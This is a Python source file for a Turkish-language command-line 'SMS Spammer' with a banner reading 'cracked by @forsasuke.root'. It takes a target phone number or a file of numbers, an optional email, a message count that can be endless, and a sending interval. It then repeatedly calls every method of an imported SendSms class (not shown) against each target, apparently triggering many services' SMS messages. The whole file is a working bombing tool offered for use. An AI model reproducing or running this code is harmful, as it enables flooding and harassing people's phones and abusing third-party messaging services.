from colorama import Fore, Style
from time import sleep
from os import system
from requests import get
from sms import SendSms
servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)
            
while 1:
    system("cls||clear")
    print("""{}
███████╗ ██████╗ ██████╗ ███████╗ █████╗ ███████╗██╗   ██╗██╗  ██╗███████╗    ███████╗███╗   ███╗███████╗
██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██║   ██║██║ ██╔╝██╔════╝    ██╔════╝████╗ ████║██╔════╝
█████╗  ██║   ██║██████╔╝███████╗███████║███████╗██║   ██║█████╔╝ █████╗      ███████╗██╔████╔██║███████╗
██╔══╝  ██║   ██║██╔══██╗╚════██║██╔══██║╚════██║██║   ██║██╔═██╗ ██╔══╝      ╚════██║██║╚██╔╝██║╚════██║
██║     ╚██████╔╝██║  ██║███████║██║  ██║███████║╚██████╔╝██║  ██╗███████╗    ███████║██║ ╚═╝ ██║███████║
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝     ╚═╝╚══════╝
                                                                  
                                                                  
                                                                          
    Sms Server: {}                    🟢 Servis Aktif!                   cracked by @forsasuke.root\n
    """.format(Fore.LIGHTRED_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.RED + " 1- SMS Spammer\n 2- Destekciler \n 3- Çıkış\n\n" + Fore.YELLOW + " Seçim: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+ Fore.LIGHTGREEN_EX, end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms."+attribute+"()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                    while sms.adet < kere:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == kere:
                                        break
                                    exec("sms."+attribute+"()")
                                    sleep(aralik)
        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
        input()
    elif menu == 2:
        system("cls||clear")
        print(Fore.BLUE + "Katkılarından Dolayı Teşekkürler \n")
        print(Fore.LIGHTWHITE_EX + "Rwizy \nRootAyyildiz")
        sleep(12)
    elif menu == 3:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break
